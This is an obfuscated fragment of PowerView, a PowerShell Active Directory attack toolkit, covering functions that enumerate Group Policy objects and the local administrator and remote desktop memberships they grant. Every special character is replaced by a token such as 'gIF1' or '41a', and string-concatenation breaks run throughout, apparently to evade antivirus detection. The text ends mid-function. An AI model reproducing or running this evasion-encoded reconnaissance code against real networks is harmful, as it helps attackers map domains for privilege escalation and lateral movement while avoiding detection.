        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aPath41a)]
        [String]
        gIF1GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1MappedPaths = @{}
    }

    PROCESS {
        try {
            if ((gIF1GroupsXMLPath -Match 41aYwWYwWYwWYwW.*YwWYwW.*41a) -and (gIF1PSBoundParameters[41aCredential41a])) {
                gIF1SysVolPath = ZfrYwWYwWgIF1((New-Object System.Uri(gIF1GroupsXMLPath)).Host)YwWSYSVOLZfr
                if (-not gIF1MappedPaths[gIF1SysVolPath]) {
                    # map IPCgIF1 to this computer if it41as not already
                    Add-RemoteConnection -Path gIF1SysVolPath -Credential gIF1Credential
                    gIF1MappedPaths[gIF1SysVolPath] = gIF1True
                }
            }

            [XML]gIF1GroupsXMLcontent = Get-Content -Path gIF1'+'GroupsXMLPath -ErrorAction Stop

            # process all group properties in the XML
            gIF1GroupsXMLcontent U9B Select-Xml Zfr/Groups/GroupZfr U9B Select-Object -ExpandProperty node U9B ForEach-Object {

                gIF1Groupname = gIF1_.Properties.groupName

                # extract the localgroup sid for memberof
                gIF1GroupSID = gIF1_.Properties.groupSid
                if (-not gIF1GroupSID) {
                    if (gIF1Groupname -match 41aAdministrators41a) {
                        gIF1GroupSID = 41aS-1-5-32-54441a
                    }
                    elseif (gIF1Groupname -match 41aRemote Desktop41a) {
                        gIF1GroupSID = 41aS-1-5-32-55541a
                    }
                    elseif (gIF1Groupname -match 41aGuests41a) {
                        gIF1GroupSID = 41aS-1-5-32-54641a
                    }
                    else {
                        if (gIF1PSBoundParameters[41aCredential41a]) {
                            gIF1GroupSID = ConvertTo-SID -ObjectName gIF1Groupname -Credential gIF1Credential
                        }
                        else {
                            gIF1GroupSID = ConvertTo-SID -ObjectName gIF1Groupname
                        }
                    }
                }

                # extract out members added to this group
                gIF1Members = gIF1_.Properties.members U9B Select-Object -ExpandProperty Member U9B Where-Object { gIF1_.action -match 41aADD41a } U9B ForEach-Object {
                    if (gIF1_.sid) { gIF1_.sid }
                    else { gIF1_.name }
                }

                if (gIF1Members) {
                    # extract out any/all filters...I hate you GPP
                    if (gIF1_.filters) {
                        gIF1Filters = gIF1_.filters.GetEnumerator() U9B ForEach-Object {
                            New-Object -TypeName PSObject -Property @{41aType41a = gIF1_.LocalName;41aValue41a = gIF1_.name}
                        }
                    }
                    else {
                        gIF1Filters = gIF1Null
                    }

                    if (gIF1Members -isnot [System.Array]) { gIF1Members = @(gIF1Members) }

                    gIF1GroupsXML = New-Object PSObject
                    gIF1GroupsXML U9B Add-Member Noteproperty 41aGPOPath41a gIF1TargetGroupsXMLPath
                    gIF1GroupsXML U9B Add-Member Noteproperty 41aFilters41a gIF1Filters
     '+'               gIF1GroupsXML U9B Add-Member Noteproperty 41aGroupName41a gIF1GroupName
                    gIF1GroupsXML U9B Add-Member Noteproperty 41aGroupSID41a gIF1GroupSID
                    gIF1GroupsXML U9B Add-Member Noteproperty 41aGroupMemberOf41a gIF1Null
                    gIF1GroupsXML U9B Add-Member Noteproperty 41aGroupMembers41a gIF1Members
                    gIF1GroupsXML.PSObject.TypeNames.Insert(0, 41aPowerView.GroupsXML41a)
                    gIF1GroupsXML
                }
            }
        }
        catch {
            Write-Verbose Zfr[Get-GroupsXML] Error parsing gIF1TargetGroupsXMLPath : gIF1_Zfr
        }
    }

    END {
        # remove the SYSVOL mappings
        gIF1MappedPaths.Keys U9B ForEach-Object { Remove-RemoteConnection -Path gIF1_ }
    }
}


function Get-DomainGPO {
<#
.SYNOPSIS

Return all GPOs or specific GPO objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainComputer, Get-DomainUser, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainObject, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Zfr-Properties samaccountname,usnchanged,...Zfr. By default, all GPO objects for
the current domain are returned. To enumerate all GPOs that are applied to
a particular machine, use -ComputerName X.

.PARAMETER Identity

A display name (e.g. 41aTest GPO41a), DistinguishedName (e.g. 41aCN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local41a),
GUID (e.g. 41a10ec320d-3111-4ef4-8faf-8f14f4adc78941a), or GPO name (e.g. 41a{F260B76D-55C8-46C5-BEF1-9016DD98E272}41a). Wildcards accepted.

.PARAMETER ComputerIdentity

Return all GPO objects applied to a given computer identity (name, dnsname, DistinguishedName, etc.).

.PARAMETER UserIdentity

Return all GPO objects applied to a given user identity (name, SID, DistinguishedName, etc.).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGPO -Domain testlab.local

Return all GPOs for the testlab.local domain

.EXAMPLE

Get-DomainGPO -ComputerName windows1.testlab.local

Returns all GPOs applied windows1.testlab.local

.EXAMPLE

Zfr{F260B76D-55C8-46C5-BEF1-901'+'6DD98E272}Zfr,ZfrTest GPOZfr U9B Get-DomainGPO

Return the GPOs with the name of Zfr{F260B76D-55C8-46C5-BEF1-9016DD98E272}Zfr and the display
name of ZfrTest GPOZfr

.EXAMPLE

Get-DomainGPO -LDAPFilter 41a(!primarygroupid=513)41a -Properties samaccountname,lastlogon

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainGPO -Credential gIF1Cred

.OUTPUTS

PowerView.GPO

Custom PSObject with translated GPO property fields.

PowerView.GPO.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDecla'+'redVarsMoreThanAssignments41a, 41a41a)]
    [OutputType(41aPowerView.GPO41a)]
    [OutputType(41aPowerView.GPO.Raw41a)]
    [CmdletBinding(DefaultParameterSetName = 41aNone41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a)]
        [String[]]
        gIF1Identity,

        [Parameter(ParameterSetName = 41aComputerIdentity41a)]
        [Alias(41aComputerName41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerIdentity,

        [Parameter(ParameterSetName = 41aUserIdentity41a)]
        [Alias(41aUserName41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    BEGIN {
        gIF1SearcherArguments '+'= @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
      '+'  if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
        gIF1GPOSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (gIF1GPOSearcher) {
            if (gIF1PSBoundParameters[41aComputerIdentity41a] -or gIF1PSBoundParameters[41aUserIdentity41a]) {
                gIF1GPOAdsPaths = @()
                if (gIF1SearcherArguments[41aProperties41a]) {
                    gIF1OldProperties = gIF1SearcherArguments[41aProperties41a]
                }
                gIF1SearcherArguments[41aProperties41a] = 41adistinguishedname,dnshostname41a
                gIF1TargetComputerName = gIF1Null

                if (gIF1PSBoundParameters[41aComputerIdentity41a]) {
                    gIF1SearcherArguments[41aIdentity41a] = gIF1ComputerIdentity
                    gIF1Computer = Get-DomainComputer @SearcherArguments -FindOne U9B Select-Object -First 1
                    if(-not gIF1Computer) {
                        Write-Verbose Zfr[Get-DomainGPO] Computer 41agIF1ComputerIdentity41a not found!Zfr
                    }
                    gIF1ObjectDN = gIF1Computer.distinguishedname
                    gIF1TargetComputerName = gIF1Computer.dnshostname
             '+'   }
                else {
                    gIF1SearcherArguments[41aIdentity41a] = gIF1UserIdentity
                    gIF1User = Get-DomainUser @SearcherArguments -FindOne U9B Select-Object -First 1
                    if(-not gIF1Use'+'r) {
                        Write-Verbose Zfr[Get-DomainGPO] User 41agIF1UserIdentity41a not found!Zfr
                    }
                    gIF1ObjectDN = gIF1User.distinguishedname
                }

                # extract all OUs the target user/computer is a part of
                gIF1ObjectOUs = @()
                gIF1ObjectOUs += gIF1ObjectDN.split(41a,41a) U9B ForEach-Object {
                    if(gIF1_.startswith(41aOU=41a)) {
                        gIF1ObjectDN.SubString(gIF1ObjectDN.IndexOf(ZfrgIF1(gIF1_),Zfr)'+')
                    }
                }
                Write-Verbose Zfr[Get-DomainGPO] object OUs: gIF1ObjectOUsZfr

                if (gIF1ObjectOUs) {
                    # find all the GPOs linked to the user/computer41as OUs
                    gIF1SearcherArguments.Remove(41aProperties41a)
                    gIF1InheritanceDisabled = gIF1False
                    ForEach(gIF1ObjectOU in gIF1ObjectOUs) {
                        gIF1SearcherArguments[41aIdentity41a] = gIF1ObjectOU
                        gIF1GPOAdsPaths += Get-DomainOU @SearcherArgum'+'ents U9B ForEach-Object {
                            # extract any GPO links for this particular OU the computer is a part of
                            if (gIF1_.gplink) {
                                gIF1_.gplink.split(41a][41a) U9B ForEach-Object {
                                    if (gIF1_.startswith(41aLDAP41a)) {
                                        gIF1Parts = gIF1_.split(41a;41a)
                                        gIF1GpoDN = gIF1Parts[0]
                                        gIF1Enforced = gIF1Parts[1]

                                        if (gIF1InheritanceDisabled) {
                                            # if inheritance has already been disabled and this GPO is set as ZfrenforcedZfr
                                            #   then add it, otherwise ignore it
                                            if (gIF1Enforced -eq 2) {
                                                gIF1GpoDN
                    '+'                        }
                                        }
                                        else {
                                            # inheritance not marked as disabled yet
                                            gIF1GpoDN
                                        }
                                    }
                                }
                            }

                            # if this OU has GPO inheritence disabled, break so additional OUs aren41at processed
                            if (gIF1_.gpoptions -eq 1) {
                                gIF1InheritanceDisabled = gIF1True
                            }
                        }
                    }
                }

                if (gIF1TargetComputerName) {
                    # find all the GPOs linked to the computer41as site
     '+'               gIF1ComputerSite = (Get-NetComputerSiteName -ComputerName gIF1TargetComputerName).SiteName
                    if(gIF1ComputerSite -and (gIF1ComputerSite -notlike 41aError*41a)) {
                        gIF1SearcherArguments[41aIdentity41a] = gIF1ComputerSite
          '+'              gIF1GPOAdsPaths += Get-DomainSite @SearcherArguments U9B ForEach-Object {
                            if(gIF1_.gplink) {
                                # extract any GPO links for this particular site the computer is a part of
                                gIF1_.gplink.split(41a][41a) U9B ForEach-Object {
                                    if (gIF1_.startswith(41aLDAP41a)) {
                                        gIF1_.split(41a;41a)[0]
                                    }
                                }
                            }
                        }
                    }
                }

                # find any GPOs linked to the user/computer41as domain
                gIF1ObjectDomainDN = gIF1ObjectDN.SubString(gIF1ObjectDN.IndexOf(41aDC=41a))
                gIF1SearcherArguments.Remove(41aIdentity41a)
                gIF1SearcherArguments.Remove(41aProperties41a)
                gIF1SearcherArguments[41aLDAPFilter41a] = Zfr(objectclass=domain)(distinguishedname=gIF1ObjectDomainDN)Zfr
                gIF1GPOAdsPaths += Get-DomainObject @SearcherArguments U9B ForEach-Object {
                    if(gIF1_.gplink) {
                        # extract any GPO links for this particular domain the computer is a part of
                        gIF1_.gplink.split(41a][41a) U9B ForEach-Object {
                            if (gIF1_.startswith(41aLDAP41a)) {
                                gIF1_.split(41a;41a)[0]
                            }
                        }
                    }
                }
                Write-Verbose Zfr[Get-DomainGPO] GPOAdsPaths: gIF1GPOAdsPathsZfr

                # restore the old properites to return, if set
                if (gIF1OldProperties) { gIF1SearcherArguments[41aProperties41a] = gIF1OldProperties }
                else { gIF1SearcherArguments.Remove(41aProperties41a) }
                gIF1SearcherArguments.Remove(41aIdentity41a)

                gIF1GPOAdsPaths U9B Where-Object {gIF1_ -and (gIF1_ -ne 41a41a)} U9B ForEach-Object {
                    # use the gplink as an ADS path to enumerate all GPOs for the computer
                    gIF1SearcherArguments[41aSearchBase41a] = gIF1_
                    gIF1SearcherArguments[41aLDAPFilter41a] = Zfr(objectCategory=groupPolicyContainer)Zfr
                    Get-DomainObject @SearcherArguments U9B ForEach-Object {
                        if (gIF1PSBoundParameters[41aRaw41a]) {
                            gIF1_.PSObject.TypeNames.Insert(0, 41aPowerView.GPO.Raw41a)
                        }
                        else {
                            gIF1_.PSObject.TypeNames.Insert(0, 41aPowerView.GPO41a)
                        }
                        gIF1_
                    }
                }
            }
            else {
                gIF1IdentityFilter = 41a41a
                gIF1Filter = 41a41a
                gIF1Identity U9B Where-Object {gIF1_} U9B ForEach-Object {
                    gIF1IdentityInstance = gIF1_.Replace(41a(41a, 41aYwW2841a).Replace(41a)41a, 41aYwW2941a)
                    if (gIF1IdentityInstance -match 41aLDAP://U9B^CN=.*41a) {
                        gIF1IdentityFilter += Zfr(distinguishedname=gIF1IdentityInstance)Zfr
                        if ((-not gIF1PSBoundParameters[41aDomain41a]) -and (-not gIF1PSBoundParameters[41aSearchBase41a])) {
                            # if a -Domain isn41at explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            gIF1IdentityDomain = gIF1IdentityInstance.SubString(gIF1IdentityInstance.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
      '+'                      Write-Verbose Zfr[Get-DomainGPO] Extracted domain 41agIF1IdentityDomain41a from 41agIF1IdentityInstance41aZfr
                            gIF1SearcherArguments[41aDomain41a] = gIF1IdentityDomain
                            gIF1GPOSearcher = Get-Dom'+'ainSearcher @SearcherArguments
                            if (-not gIF1GPOSearcher) {
                                Write-Warning Zfr[Get-DomainGPO] Unable to retrieve domain searcher for 41agIF1IdentityDomain41aZfr
                            }
                        }
                    }
                    elseif (gIF1IdentityInstance -match 41a{.*}41a) {
                        gIF1IdentityFilter += Zfr(name=gIF1IdentityInstance)Zfr
                    }
                    else {
                        try {
                            gIF1GuidByteString = (-Join (([Guid]gIF1IdentityInstance).ToByteArray() U9B ForEach-'+'Object {gIF1_.ToString(41aX41a).PadLeft(2,41a041a)})) -Replace 41a(..)41a,41aYwWgIF1141a
                            gIF1IdentityFilter += Zfr(objectguid=gIF1GuidByteString)Zfr
                        }
                        catch {
                            gIF1IdentityFilter += Zfr(displayname=gIF1IdentityInstance)Zfr
                        }
                    }
                }
                if (gIF1IdentityFilter -and (gIF1IdentityFilter.Trim() -ne 41a41a) ) {
                    gIF1Filter += Zfr(U9BgIF1IdentityFilter)Zfr
                }

                if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
             '+'       Write-Verbose Zfr[Get-DomainGPO] Using additional LDAP filter: gIF1LDAPFilterZfr
                    gIF1Filter += ZfrgIF1LDAPFilterZfr
                }

                gIF1GPOSearcher.filter = Zfr(&(objectCategory=groupPolicyContainer)gIF1Filter)Zfr
                Write-Verbose Zfr[Get-DomainGPO] filter string: gIF1'+'(gIF1GPOSearcher.filter)Zfr

                if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1GPOSearcher.FindOne() }
                else { gIF1Results = gIF1GPOSearcher.FindAll() }
                gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                    if (gIF1PSBoundParameters[41aRaw41a]) {
                        # return raw result objects
                        gIF1GPO = gIF1_
                        gIF1GPO.PSObject.TypeNames.Insert(0, 41aPowerView.GPO.Raw41a)
                    }
                    else {
                        if (gIF1PSBoundParameters[41aSearchBase41a] -and (gIF1SearchBase -Match 41a^GC://41a)) {
                            gIF1GPO = Convert-LDAPProperty -Properties gIF1_.Properties
                            try {
                                gIF1GPODN = gIF1GPO.distinguishedname
                                gIF1GPODomain = gIF1GPODN.SubString(gIF1GPODN.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                                gIF1gpcfilesyspath = ZfrYwWYwWgIF1GPODomainYwWSysVolYwWgIF1GPODomainYwWPoliciesYwWgIF1(gIF1GPO.cn)Zfr
                                gIF1GPO U9B Add-Member Noteproperty 41agpcfilesyspath41a gIF1gpcfilesyspath
                            }
                            catch {
                                Write-Verbose Zfr[Get-DomainGPO] Error calculating gpcfilesyspath for: gIF1(gIF1GPO.distinguishedname)Zfr
                            }
                        }
                        else {
                            gIF1GPO = Convert-LDAPProperty -Properties gIF1_.Properties
                        }
                        gIF1GPO.PSObject.TypeNames.Insert(0, 41aPowerView.GPO41a)
                    }
                    gIF1GPO
                }
                if (gIF1Results) {
                    try { gIF1Results.dispose() }
                    catch {
                        Write-Verbose Zfr[Get-DomainGPO] Error disposing of the Results object: gIF1_Zfr
                    }
                }
                gIF1GPOSearcher.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {
<#
.SYNOPSIS

Returns all GPOs in a domain that modify local group memberships through 41aRestricted Groups41a
or Group Policy preferences. Also return their user membership mappings, if they exist.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, Get-GroupsXML, ConvertTo-SID, ConvertFrom-SID  

.DESCRIPTION

First enumerates all GPOs in the current/target domain using Get-DomainGPO with passed
arguments, and for each GPO checks if 41aRestricted Groups41a are set with GptTmpl.inf or
group membership is set through Group Policy Preferences groups.xml files. For any
GptTmpl.inf files found, the file is parsed with Get-GptTmpl and any 41aGroup Membership41a
section data is processed if present. Any found Groups.xml files are parsed with
Get-GroupsXML and those memberships are returned as well.

.PARAMETER Identity

A display name (e.g. 41aTest GPO41a), DistinguishedName (e.g. 41aCN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local41a),
GUID (e.g. 41a10ec320d-3111-4ef4-8faf-8f14f4adc78941a), or GPO name (e.g. 41a{F260B76D-55C8-46C5-BEF1-9016DD98E272}41a). Wildcards accepted.

.PARAMETER ResolveMembersToSIDs

Switch. Indicates that any member names should be resolved to their domain SIDs.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOLocalGroup

Returns all local groups set by GPO along with their members and memberof.

.EXAMPLE

Get-DomainGPOLocalGroup -ResolveMembersToSIDs

Returns all local groups set by GPO along with their members and memberof,
and resolve any members to their domain SIDs.

.EXAMPLE

41a{0847C615-6C4E-4D45-A064-6001040CC21C}41a U9B Get-DomainGPOLocalGroup

Return any GPO-set groups for the GPO wi'+'th'+' the given name/GUID.

.EXAMPLE

Get-DomainGPOLocalGroup 41aDesktops41a

Return any GPO-set'+' groups for the GPO with the given display name.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainGPOLocalGroup -'+'Credential gIF1Cred

.LINK

https://morgansimonsenblog.azurewebsites.net/tag/groups/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.GPOGroup41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPrope'+'rtyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a)]
        [String[]]
        gIF1Identity,

        [Switch]
        gIF1ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,
'+'

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1SearcherArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aLDAPFilter41a]) { gIF1SearcherArguments[41aLDAPFilter41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1Se'+'archerArguments[41aCredential41a] = gIF1Credential }

        gIF1ConvertArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ConvertArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ConvertArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ConvertArguments[41aCredential41a] = gIF1Credential }

        gIF1SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aIdentity41a]) { gIF1SearcherArguments[41aIdentity41a] = gIF1Identity }

        Get-DomainGPO @SearcherArguments U9B ForEach-Object {
            gIF1GPOdisplayName = gIF1_.displayname
            gIF1GPOname = gIF1_.name
            gIF1GPOPath = gIF1_.gpcfilesyspath

            gIF1ParseArgs =  @{ 41aGptTmplPath41a = ZfrgIF1GPOPathYwWMACHINEYwWMicrosoftYwWWindows NTYwWSecEditYwWGptTmpl.infZfr }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ParseArgs[41aCredential41a] = gIF1Credential }

            # first parse the 41aRestricted Groups41a file (GptTmpl.inf) if it exists
            gIF1Inf = Get-GptTmpl @ParseArgs

            if (gIF1Inf -and (gIF1Inf.psbase.Keys -contains 41aGroup Membership41a)) {
                gIF1Memberships = @{}

                # parse the members/memberof fields for each entry
                ForEach (gIF1Membership in gIF1Inf.41aGroup Membership41a.GetEnumerator()) {
                    gIF1Group, gIF1Relation = gIF1Membership.Key.Split(41a__41a, gIF1SplitOption) U9B ForEach-Object {gIF1_.Trim()}
                    # extract out ALL members
                    gIF1MembershipValue = gIF1Membership.Value U9B Where-Object {gIF1_} U9B ForEach-Object { gIF1_.Trim(41a*41a) } U9B Where-Object {gIF1_}

                    if (gIF1PSBoundParameters[41aResolveMembersToSIDs41a]) {
                        # if the resulting member is username and not a SID, attempt to resolve it
                        gIF1GroupMembers = @()
                        ForEach (gIF1Member in gIF1MembershipValue) {
                            if (gIF1Member -and (gIF1Member.Trim() -ne 41a41a)) {
                                if (gIF1Member -notmatch 41a^S-1-.*41a) {
                                    gIF1ConvertToArguments = @{41aObjectName41a = gIF1Member}
                                    if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ConvertToArguments[41aDomain41a] = gIF1Domain }
                                    gIF1MemberSID = ConvertTo-SID @ConvertToArguments

   '+'                                 if (gIF1MemberSID) {
                                        gIF1GroupMembers += gIF1MemberSID
                                    }
                                    else {
                                        gIF1GroupMembers += gIF1Member
                                    }
               '+'                 }
                                else {
                                    gIF1GroupMembers += gIF1Member
                                }
                            }
                        }
                        gIF1MembershipValue = gIF1GroupMembers
                    }

                    if (-not gIF1Memberships[gIF1Group]) {
                        gIF1Memberships[gIF1Group] = @{}
                    }
                    if (gIF1MembershipValue -isnot [System.Array]) {gIF1MembershipValue = @(gIF1MembershipValue)}
                    gIF1Memberships[gIF1Group].Add(gIF1Relation, gIF1MembershipValue)
                }

                ForEach (gIF1Membership in gIF1Memberships.GetEnumerator()) {
                    if (gIF1Membership -and gIF1Membership.Key -and (gIF1Membership.Key -match 41a^YwW*41a)) {
                        # if the SID is already resolved (i.e. begins with *) try to resolve SID to a name
                        gIF1GroupSID = gIF1Membership.Key.Trim(41a*41a)
                        if (gIF1GroupSID -and (gIF1GroupSID.Trim() -ne 41a41a)) {
                            gIF1GroupName = ConvertFrom-SID -ObjectSID gIF1GroupSID @ConvertArguments
                        }
                        else {
                            gIF1GroupName = gIF1False
                        }
                    }
                    else {
                        gIF1GroupName = gIF1Membership.Key

                        if (gIF1GroupName -and (gIF1GroupName.Trim() -ne 41a41a)) {
                            if (gIF1Groupname -match 41aAdministrators41a) {
                                gIF1GroupSID = 41aS-1-5-32-54441a
                            }
                            elseif (gIF1Groupname -match 41aRemote Desktop41a) {
                                gIF1GroupSID = 41aS-1-5-32-55541a
                            }
                            elseif (gIF1Groupname -match 41aGuests41a) {
                                gIF1GroupSID = 41aS-1-5-32-54641a
                            }
                            elseif (gIF1GroupName.Trim() -ne 41a41a) {
                                gIF1ConvertToArguments = @{41aObjectName41a = gIF1Groupname}
                                if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ConvertToArguments[41aDomain41a] = gIF1Domain }
                                gIF1GroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
